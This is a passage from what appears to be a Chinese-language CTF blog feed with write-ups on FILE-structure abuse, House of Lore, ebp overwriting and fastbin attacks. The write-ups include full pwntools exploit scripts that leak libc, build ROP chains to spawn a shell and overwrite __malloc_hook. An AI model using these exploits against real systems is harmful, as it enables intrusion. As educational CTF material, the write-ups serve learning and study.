    _lock = 0x7f7632990790 &lt;_IO_stdfile_0_lock&gt;, 
    _offset = 0xffffffffffffffff, 
    _codecvt = 0x0, 
    _wide_data = 0x7f763298e9c0 &lt;_IO_wide_data_0&gt;, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0xffffffff, 
    _unused2 = '\000' &lt;repeats 19 times&gt;
  }, 
  vtable = 0x7f763298d6e0 &lt;_IO_file_jumps&gt;
}
</code></pre>
<p>第一次时 _IO_read_ptr与_IO_read_end相同，这里就不需要修改了，这里修改 _IO_buf_base</p>
<pre><code>gdb-peda$ x/4gx 0x7f763298e900
0x7f763298e900 &lt;_IO_2_1_stdin_+32&gt;:	0x00007f763298e963	0x00007f763298e963
0x7f763298e910 &lt;_IO_2_1_stdin_+48&gt;:	0x00007f763298e963	0x00007f763298e963
gdb-peda$ 
0x7f763298e920 &lt;_IO_2_1_stdin_+64&gt;:	0x00007f763298e964	0x0000000000000000
0x7f763298e930 &lt;_IO_2_1_stdin_+80&gt;:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>可以看到0x7f763298e918处是_IO_buf_base的值，0x7f763298e920是  _IO_buf_end的值，这通过给的so文件得到 _IO_2_1_stdin_的地址，然后向</p>
<pre><code>ssize_t __fastcall sub_B45(void *a1)
{
  printf(&quot;name:&quot;);
  return read(0, a1, 7uLL);
}
</code></pre>
<p>写入_IO_buf_base的地址，_</p>
<pre><code>gdb-peda$ stack 20
0000| 0x7ffd08c81420 --&gt; 0x557023eefef8 --&gt; 0x74697865202e33 ('3. exit')
0008| 0x7ffd08c81428 --&gt; 0x7ffd08c81470 --&gt; 0x7f763298e928 --&gt; 0x0 
0016| 0x7ffd08c81430 --&gt; 0xa32 ('2\n')
0024| 0x7ffd08c81438 --&gt; 0x71c6f3700 
0032| 0x7ffd08c81440 --&gt; 0x0 
0040| 0x7ffd08c81448 --&gt; 0x83483fdd1c6f3700 
0048| 0x7ffd08c81450 --&gt; 0x7ffd08c81480 --&gt; 0x557023eefd30 (push   r15)#偏移12
0056| 0x7ffd08c81458 --&gt; 0x557023eefd08 (jmp    0x557023eefd0b)#偏移13
0064| 0x7ffd08c81460 --&gt; 0x557023eefd30 (push   r15)
0072| 0x7ffd08c81468 --&gt; 0x200000001 
0080| 0x7ffd08c81470 --&gt; 0x7f763298e928 --&gt; 0x0 #偏移16
0088| 0x7ffd08c81478 --&gt; 0x83483fdd1c6f3700 
0096| 0x7ffd08c81480 --&gt; 0x557023eefd30 (push   r15)
0104| 0x7ffd08c81488 --&gt; 0x7f76325ea840 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)#偏移19
0112| 0x7ffd08c81490 --&gt; 0x1 
0120| 0x7ffd08c81498 --&gt; 0x7ffd08c81568 --&gt; 0x7ffd08c8323d (&quot;./echo_back&quot;)
0128| 0x7ffd08c814a0 --&gt; 0x132bb9ca0 
0136| 0x7ffd08c814a8 --&gt; 0x557023eefc6c (push   rbp)
</code></pre>
<p>_这里知道name的偏移为16，直接修改低两位为\x00，就是修改_IO_buf_base处的指针为0x7f763298e900，然后向其中写入数据就覆盖了IO_buf_base与_IO_buf_end。IO_buf_base改为返回地址，同时修改 _IO_buf_end的值，使得足够输入payload，</p>
<pre><code>payload = p64(IO_stdin_addr + 131) * 3 + p64(main_ret) + p64(main_ret + 3 * 0x8)
</code></pre>
<p>这里传入payload后，_IO_read_end的位置就变了，就不等于_IO_read_ptr，这里通过getchar来改变_IO_read_ptr。</p>
<p>而程序中刚好有</p>
<pre><code>for i in range(0,len(payload) - 1):
    r.sendlineafter('choice&gt;&gt; ', '2')
    r.sendlineafter('length:', '0')
</code></pre>
<p>然后就是通过ROP来getshell了</p>
<pre><code>r.sendlineafter('choice&gt;&gt; ', '2')
r.sendlineafter('length:', p64(prdi) + p64(bin_sh) + p64(system))
r.sendline('')
</code></pre>
<p>exp:</p>
<pre><code>#! /usr/bin/env python
#-*- coding:utf-8 -*
from pwn import *
r = process('./echo_back')
#r = remote('220.249.52.134',53037)
context.log_level = 'debug'

elf = ELF('./echo_back')
libc = ELF('./libc.so.6')
prdi = 0x0000000000000d93
main_P_addr = 0xc6c
IO_stdin = libc.symbols['_IO_2_1_stdin_']

def echo_back(size, con):
    r.sendlineafter('choice&gt;&gt; ', '2')
    r.sendlineafter('length:', str(size))
    r.send(con)

def name(name):
    r.sendlineafter('choice&gt;&gt; ', '1')
    r.sendafter('name:', name)
#gdb.attach(r)
echo_back(7, '%19$p')
r.recvuntil('0x')
libc_s_m_addr = int(r.recvuntil('-').split('-')[0], 16) - 240
print hex(libc_s_m_addr)

offset = libc_s_m_addr - libc.symbols['__libc_start_main']
system = libc.symbols['system'] + offset
bin_sh = libc.search('/bin/sh').next() + offset
IO_stdin_addr = IO_stdin + offset
print hex(offset)
echo_back(7, '%13$p')
r.recvuntil('0x')
elf_base = int(r.recvuntil('-', drop=True), 16) - 0xd08
prdi = prdi + elf_base

echo_back(7, '%12$p')
r.recvuntil('0x')
main_ebp = int(r.recvuntil('-', drop=True), 16)
main_ret = main_ebp + 0x8

IO_buf_base = IO_stdin_addr + 0x8 * 7
name(p64(IO_buf_base))
echo_back(7, '%16$hhn')#修改_IO_buf_base使得能使payload覆盖_IO_buf_base，同时使得payload能完整的输进去

payload = p64(IO_stdin_addr + 131) * 3 + p64(main_ret) + p64(main_ret + 3 * 0x8)修改#_IO_buf_base为存储返回地址的内存地址，修改_IO_buf_end使得足够输入ROP
r.sendlineafter('choice&gt;&gt; ', '2')
r.sendafter('length:', payload)
r.sendline('')

for i in range(0,len(payload) - 1):
    r.sendlineafter('choice&gt;&gt; ', '2')
    r.sendlineafter('length:', '0')

r.sendlineafter('choice&gt;&gt; ', '2')
r.sendlineafter('length:', p64(prdi) + p64(bin_sh) + p64(system))#覆盖返回地址
r.sendline('')

r.sendlineafter('choice&gt;&gt; ', '3')退出程序，触发写入的ROP
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[House of lore]]></title>
        <id>https://czh11.github.io/post/house-of-lore/</id>
        <link href="https://czh11.github.io/post/house-of-lore/">
        </link>
        <updated>2020-12-16T12:25:21.000Z</updated>
        <content type="html"><![CDATA[<p>利用前提：</p>
<p>控制Small Bin Chunk的bk指针，控制指定位置chunk的fd指针</p>
<p>实现分配任意指定位置的chunk，修改任意地址的内存</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

void jackpot(){ puts(&quot;Nice jump d00d&quot;); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, &quot;\nWelcome to the House of Lore\n&quot;);
  fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;);
  fprintf(stderr, &quot;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n&quot;);

  fprintf(stderr, &quot;Allocating the victim chunk\n&quot;);
  intptr_t *victim = malloc(100);
  fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\n&quot;, victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;#得到chunk头的地址

  fprintf(stderr, &quot;stack_buffer_1 at %p\n&quot;, (void*)stack_buffer_1);
  fprintf(stderr, &quot;stack_buffer_2 at %p\n&quot;, (void*)stack_buffer_2);

  fprintf(stderr, &quot;Create a fake chunk on the stack&quot;);
  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;
         &quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;);
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;#把chunk的地址给它，满足bck-&gt;fd=!victim的检测

  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;
         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;
         &quot;chunk on stack&quot;);
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;
         &quot;the small one during the free()\n&quot;);
  void *p5 = malloc(1000);#防止free点chunk1后合并到top chunk
  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\n&quot;, p5);


  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;, victim);
  free((void*)victim);

  fprintf(stderr, &quot;\nIn the unsorted bin the victim's fwd and bk pointers are nil\n&quot;);
  fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]);
  fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);

  fprintf(stderr, &quot;Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n&quot;);
  fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;, victim);

  void *p2 = malloc(1200);#通过再unsorted bins中没找到合适的chunk，使得chunk1进入small bins中
  fprintf(stderr, &quot;The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;, p2);

  fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;);
  fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]);
  fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);

  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack

  //------------------------------------

  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\n&quot;);
  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;);

  void *p3 = malloc(100);#申请到chunk1


  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;);
  char *p4 = malloc(100);#申请到fake chunk
  fprintf(stderr, &quot;p4 = malloc(100)\n&quot;);

  fprintf(stderr, &quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;,
         stack_buffer_2[2]);

  fprintf(stderr, &quot;\np4 is %p and should be on the stack!\n&quot;, p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
</code></pre>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
from LibcSearcher import *
context.log_level='debug'
r=process(&quot;./babyheap&quot;)
def add(size):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;1&quot;)
    r.recvuntil(&quot;Size: &quot;)
    r.sendline(str(size))
def fill(index,size,content):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;2&quot;)
    r.recvuntil(&quot;Index: &quot;)
    r.sendline(str(index))
    r.recvuntil(&quot;Size: &quot;)
    r.sendline(str(size))
    r.recvuntil(&quot;Content: &quot;)
    r.send(content)
def free(index):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;3&quot;)
    r.recvuntil(&quot;Index: &quot;)
    r.sendline(str(index))
def dump(index):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;4&quot;)
    r.recvuntil(&quot;Index: &quot;)
    r.sendline(str(index))
gdb.attach(r)
add(0x10)#chunk0
add(0x10)#chunk1
add(0x10)#chunk2
add(0x10)#chunk3
add(0x80)#chunk4
add(0x80)#chunk5
free(2)#free chunk2
free(1)#free chunk1
payload='a'*0x10+p64(0)+p64(0x21)+p8(0x80)#堆的始终是 4KB 对齐的，所以chunk4的起始地址的第一个字节必然是0x80
fill(0,len(payload),payload)
payload='a'*0x10+p64(0)+p64(0x21)
fill(3,len(payload),payload)
add(0x10)#chunk1
add(0x10)#chunk2
payload='a'*0x10+p64(0)+p64(0x91)
fill(3,len(payload),payload)
free(4)#free chunk4
dump(2)
r.recvuntil(&quot;Content: &quot;)
main_arena=u64(r.recv()[1:8].ljust(8,'\x00'))-88
main_arena_offset=0x3c3b20
libcbase=main_arena-main_arena_offset
onegadget=libcbase+0x4525a
print(hex(onegadget))
print(hex(main_arena))
add(0x60)#chunk4
free(4)
fake_chunk=main_arena-0x33
payload='a'*0x10+p64(0)+p64(0x71)+p64(fake_chunk)
fill(3,len(payload),payload)
add(0x60)#chunk4
add(0x60)#chunk6
payload='a'*0x13+p64(onegadget)
fill(6,len(payload),payload)
add(0x90)
r.interactive()
</code></pre>
<p>运行结果</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ ./lore

Welcome to the House of Lore
This is a revisited version that bypass also the hardening check introduced by glibc malloc
This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23

Allocating the victim chunk
Allocated the first small chunk on the heap at 0x944010
stack_buffer_1 at 0x7ffd43b1f810
stack_buffer_2 at 0x7ffd43b1f7f0
Create a fake chunk on the stackSet the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
Allocated the large chunk on the heap at 0x944080
Freeing the chunk 0x944010, it will be inserted in the unsorted bin

In the unsorted bin the victim's fwd and bk pointers are nil
victim-&gt;fwd: (nil)
victim-&gt;bk: (nil)

Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
This means that the chunk 0x944010 will be inserted in front of the SmallBin
The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x944470
The victim chunk has been sorted and its fwd and bk pointers updated
victim-&gt;fwd: 0x7fb50942abd8
victim-&gt;bk: 0x7fb50942abd8

Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer
Now allocating a chunk with size equal to the first one freed
This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer
This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk
p4 = malloc(100)

The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fb50942abd8

p4 is 0x7ffd43b1f820 and should be on the stack!
Nice jump d00d
giantbranch@ubuntu:~/Desktop$ 
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[通过修改ebp改变程序的走向]]></title>
        <id>https://czh11.github.io/post/tong-guo-xiu-gai-ebp-gai-bian-cheng-xu-de-zou-xiang/</id>
        <link href="https://czh11.github.io/post/tong-guo-xiu-gai-ebp-gai-bian-cheng-xu-de-zou-xiang/">
        </link>
        <updated>2020-12-16T03:29:49.000Z</updated>
        <content type="html"><![CDATA[<p>查看保护</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ checksec format2
[*] '/home/giantbranch/Desktop/format2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>用ida打开</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+18h] [ebp-28h]
  char s; // [esp+1Eh] [ebp-22h]
  unsigned int v6; // [esp+3Ch] [ebp-4h]

  memset(&amp;s, 0, 0x1Eu);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf(&quot;Authenticate : &quot;);
  _isoc99_scanf(&quot;%30s&quot;, &amp;s);
  memset(&amp;input, 0, 0xCu);
  v4 = 0;
  v6 = Base64Decode((int)&amp;s, &amp;v4);
  if ( v6 &gt; 0xC )
  {
    puts(&quot;Wrong Length&quot;);
  }
  else
  {
    memcpy(&amp;input, v4, v6);
    if ( auth(v6) == 1 )
      correct();
  }
  return 0;
}
</code></pre>
<p>Base64Decode((int)&amp;s, &amp;v4)对输入的数进行了解密，同时把长度赋给v6，这里对v6进行了限制，输入的数据不能超过12个，进入auth（）函数中查看</p>
<pre><code>_BOOL4 __cdecl auth(int a1)
{
  char v2; // [esp+14h] [ebp-14h]
  char *s2; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h]

  memcpy(&amp;v4, &amp;input, a1);
  s2 = (char *)calc_md5((int)&amp;v2, 12);
  printf(&quot;hash : %s\n&quot;, s2);
  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;
}
</code></pre>
<p>发现v4最多8个字节，而输入最多12个，刚好可以覆盖ebp，在函数执行完后一般会执行</p>
<pre><code>leave
retn
</code></pre>
<p>这相当于</p>
<pre><code>mov esp,ebp#将ebp的值赋给esp
pop ebp#将栈中存储的上一个栈的ebp赋给ebp
retn#call [rsp+4]
</code></pre>
<p>这时让input=‘aaaa'+p32(0x8049284)+p32(0x811eb40)</p>
<pre><code>gdb-peda$ x/4gx 0x0811EB40
0x811eb40 &lt;input&gt;:	0x0804928461616161	0x000000000811eb40
0x811eb50 &lt;OPENSSL_ia32cap_P&gt;:	0xfffa32034f8bffff	0x0000000000000000
</code></pre>
<p>这时栈中的情况：</p>
<pre><code>0032| 0xffb034a0 (&quot;aaaa\204\222\004\b@\353\021\b\a\224\004&quot;...)
0036| 0xffb034a4 --&gt; 0x8049284 (&lt;correct+37&gt;:	mov    DWORD PTR [esp],0x80da66f)#ebp
0040| 0xffb034a8 --&gt; 0x811eb40 (&quot;aaaa\204\222\004\b@\353\021\b&quot;)
</code></pre>
<p>可以发现ebp处的值覆盖为input的地址</p>
<p>各寄存器的情况</p>
<pre><code>EAX  0x0
 EBX  0x80481d0 (_init) ◂— push   ebx
 ECX  0x61
 EDX  0x80da684 ◂— cmp    byte ptr [edi], dh
 EDI  0x811b00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x80a6470 (__stpcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
 ESI  0x0
 EBP  0xffb034a8 —▸ 0x811eb40 (input) ◂— 0x61616161 ('aaaa')
 ESP  0xffb03480 —▸ 0x80da684 ◂— cmp    byte ptr [edi], dh
 EIP  0x804930b (auth+111) ◂— leave  
</code></pre>
<p>再auth（）函数结束只会进行如下操作</p>
<pre><code>mov esp,ebp#0xffb034a8存储再esp中
pop ebp #将0x811eb40赋给ebp
retn #call [esp+4],及call[0xffb034ac]
</code></pre>
<pre><code>EBP  0x811eb40 (input) ◂— 0x61616161 ('aaaa')
ESP  0xffb034ac —▸ 0x8049407 (main+250) ◂— cmp    eax, 1
</code></pre>
<p>这时进入主函数中，这时个寄存器的状况</p>
<pre><code>EAX  0x0
 EBX  0x80481d0 (_init) ◂— push   ebx
 ECX  0x61
 EDX  0x80da684 ◂— cmp    byte ptr [edi], dh
 EDI  0x811b00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x80a6470 (__stpcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
 ESI  0x0
 EBP  0x811eb40 (input) ◂— 0x61616161 ('aaaa')
 ESP  0xffb034b0 ◂— 0xc /* '\x0c' */
 EIP  0x8049424 (main+279) ◂— leave  
</code></pre>
<p>这时进行</p>
<pre><code>mov esp,ebp #esp=0x811eb40
pop ebp #ebp=0x61616161
retn #call[0x811eb40+4],而0x811eb44刚好存储着getshell的地址
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Fastbin Attack]]></title>
        <id>https://czh11.github.io/post/fastbin-attack/</id>
        <link href="https://czh11.github.io/post/fastbin-attack/">
        </link>
        <updated>2020-12-11T12:18:22.000Z</updated>
        <content type="html"><![CDATA[<p>fastbin attack</p>
<p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p>
<p>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞<br>
漏洞发生于 fastbin 类型的 chunk 中<br>
如果细分的话，可以做如下的分类：</p>
<p>Fastbin Double Free</p>
<p>Fastbin Double Free是指fastbin中的chunk可以被多次释放，因此可以在fastbin链表中存在多次，可导致多个指针指向同一个堆块</p>
<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
<p>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空<br>
fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p>
<pre><code>/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = &quot;double free or corruption (fasttop)&quot;;
        goto errout;
}
</code></pre>
<p>例如。申请chunk0，chunk1，然后释放chunk0，chunk1，此时链表中的main_arena-&gt;chunk1-&gt;chunk0，如果此时在释放chunk0，链表中的情况：main_arena-&gt;chunk0-&gt;chunk1-&gt;chunk0.</p>
<p>House of Spirit<br>
Alloc to Stack<br>
Arbitrary Alloc</p>
<p>例子：</p>
<p>查看代码</p>
<p>有四个功能，Allocate，Fill， Free，Dump</p>
<pre><code>unsigned __int64 __fastcall sub_E7F(__int64 a1, __int64 a2)
{
  unsigned __int64 result; // rax
  int v3; // [rsp+18h] [rbp-8h]
  int v4; // [rsp+1Ch] [rbp-4h]

  printf(&quot;Index: &quot;, a2);
  result = sub_138C(&quot;Index: &quot;, a2);
  v3 = result;
  if ( (result &amp; 0x80000000) == 0LL &amp;&amp; (signed int)result &lt;= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf(&quot;Size: &quot;);
      result = sub_138C(&quot;Size: &quot;, a2);
      v4 = result;
      if ( (signed int)result &gt; 0 )
      {
        printf(&quot;Content: &quot;);
        result = sub_11B2(*(_QWORD *)(24LL * v3 + a1 + 16), v4);
      }
    }
  }
  return result;
}
</code></pre>
<p>在fill功能中没有对size的大小作出限制，可以造成堆溢出，</p>
<p>查看下保护</p>
<pre><code>giantbranch@ubuntu:~/Desktop$ checksec babyheap
[*] '/home/giantbranch/Desktop/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  '/home/giantbranch/glibc-all-in-one-master/libs/2.23-0ubuntu3_amd64'

</code></pre>
<p>保护全开。</p>
<p>基本思路：</p>
<p>利用 unsorted bin 地址泄漏 libc 基地址。<br>
利用 fastbin attack 将chunk 分配到 malloc_hook 附近。</p>
<p>首先申请6个堆，chunk0，chunk1，chunk2，chunk3，chunk4，chunk5。chunk5</p>
<pre><code>add(0x10)#chunk0
add(0x10)#chunk1
add(0x10)#chunk2
add(0x10)#chunk3
add(0x80)#chunk4
add(0x80)#chunk5，防止chunk4被释放后合并到top chunk中
</code></pre>
<pre><code>gdb-peda$ heap
0x559d2111f000 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x559d2111f020 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x559d2111f040 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x559d2111f060 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x91
}
0x559d2111f080 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x91, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x559d2111f110 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x91, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x559d2111f1a0 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20e61, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p>释放chunk2，chunk1</p>
<pre><code>0x20: 0x559d2111f020 —▸ 0x559d2111f040 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
</code></pre>
<pre><code>0x559d2111f020 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x559d2111f040, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x559d2111f040 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
</code></pre>
<p>这时修改chunk1的fd为chunk4的地址，使得chunk1-&gt;chunk4，同时在申请堆的时候会对size的大小进行检测，这里通过chunk3溢出修改chunk4的堆的大小为0x21</p>
<pre><code>free(2)#free chunk2
free(1)#free chunk1
payload='a'*0x10+p64(0)+p64(0x21)+p8(0x80)
fill(0,len(payload),payload)
payload='a'*0x10+p64(0)+p64(0x21)
fill(3,len(payload),payload)
add(0x10)#chunk1
add(0x10)#chunk2
</code></pre>
<pre><code>0x559d2111f000 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x6161616161616161, 
  bk = 0x6161616161616161, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x559d2111f020 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x559d2111f080, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
</code></pre>
<pre><code>0x559d2111f080 FASTBIN {
  prev_size = 0x0, 
  size = 0x21, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p>这时chunk2也指向chunk4</p>
<p>然后再通过chunk3把chunk4的size大小修改回去，</p>
<pre><code>0x559d2111f080 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x91, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p>同时释放chunk4，这时chunk4的fd和bk都指向main_arena+88</p>
<pre><code>0x559d2111f080 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x91, 
  fd = 0x7f7acadeeb78 &lt;main_arena+88&gt;, 
  bk = 0x7f7acadeeb78 &lt;main_arena+88&gt;, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p>由于chunk2与chunk4指向同一个堆块，这时只要输出chunk2的内容就得到main_arena+88，这样就得到libcbase，这里由于got表不可写，通过修改malloc_hook来达到目的，</p>
<pre><code>gdb-peda$ x/4gx 0x7f7acadeeb20-0x33
0x7f7acadeeaed &lt;_IO_wide_data_0+301&gt;:	0x7acaded260000000	0x000000000000007f
0x7f7acadeeafd:	0x7acaab03f0000000	0x7acaaaffd000007f
gdb-peda$ x/4gx 0x7f7acadeeb20-0x10
0x7f7acadeeb10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000
0x7f7acadeeb20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>可以发现main_arena+88-0x33这个地方适合伪造fake_chunk</p>
<p>接下来申请一个0x61大小的chunk4，同时释放它，然后修改chunk4的fd为fake_chunk的地址，然后连续申请两个0x60大小的堆，这样就申请到了fake_chunk。</p>
<pre><code>add(0x60)
free(4)
fake_chunk=main_arena-0x33
payload='a'*0x10+p64(0)+p64(0x71)+p64(fake_chunk)
fill(3,len(payload),payload)
add(0x60)
add(0x60)
</code></pre>
<pre><code>gdb-peda$ bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x559d2111f080 —▸ 0x7f7acadeeaed (_IO_wide_data_0+301) ◂— 0x7acaab03f0000000
0x80: 0x0
</code></pre>
<p>之后就修改 malloc_hook 处的指针即可得到触发 onegadget。</p>
<pre><code>gdb-peda$ x/4gx 0x7f7acadeeb10
0x7f7acadeeb10 &lt;__malloc_hook&gt;:	0x00007f7acaa7025a	0x0000000000000000
0x7f7acadeeb20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>exp：</p>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
from LibcSearcher import *
context.log_level='debug'
r=process(&quot;./babyheap&quot;)
def add(size):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;1&quot;)
    r.recvuntil(&quot;Size: &quot;)
    r.sendline(str(size))
def fill(index,size,content):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;2&quot;)
    r.recvuntil(&quot;Index: &quot;)
    r.sendline(str(index))
    r.recvuntil(&quot;Size: &quot;)
    r.sendline(str(size))
    r.recvuntil(&quot;Content: &quot;)
    r.send(content)
def free(index):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;3&quot;)
    r.recvuntil(&quot;Index: &quot;)
    r.sendline(str(index))
def dump(index):
    r.recvuntil(&quot;Command: &quot;)
    r.sendline(&quot;4&quot;)
    r.recvuntil(&quot;Index: &quot;)
    r.sendline(str(index))
gdb.attach(r)
add(0x10)#chunk0
add(0x10)#chunk1
add(0x10)#chunk2
add(0x10)#chunk3
add(0x80)#chunk4
add(0x80)#chunk5
free(2)#free chunk2
free(1)#free chunk1
